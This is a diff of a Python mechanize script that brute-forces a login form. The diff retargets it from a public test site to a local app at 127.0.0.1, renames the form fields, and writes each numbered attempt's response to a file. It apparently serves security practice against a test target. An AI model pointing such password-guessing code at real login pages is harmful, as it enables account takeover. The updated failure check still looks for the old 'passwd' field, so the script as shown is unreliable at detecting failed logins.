@@ -15,7 +15,7 @@ from itertools import combinations
 
 from string import ascii_lowercase
 
-url = "http://www.webscantest.com/login.php"
+url = "http://127.0.0.1:5000/login"
 
 browser = mechanize.Browser()
 
@@ -29,10 +29,10 @@ for p in passwords:
     browser.open(url)
 
     browser.select_form(nr=0)
+    print(browser)
+    browser["username"] = 'testuser'
 
-    browser["login"] = 'testuser'
-
-    browser["passwd"] = ''.join(p)
+    browser["password"] = ''.join(p)
 
     res = browser.submit()
 
@@ -45,14 +45,14 @@ for p in passwords:
 
     # Write response to file
 
-    output = open('response/' + str(attackNumber) + '.txt', 'w')
+    output = open('response' + str(attackNumber) + '.txt', 'w')
 
-    output.write(content)
+    output.write(content.decode('utf-8'))
 
     output.close()
 
     attackNumber += 1
     # check if we were taken back to the login page or not
 
-    if content.find('<input type="password" name="passwd" />') > 0:
+    if content.find(b'<input type="password" name="passwd" />') > 0:
         print("Login failed")
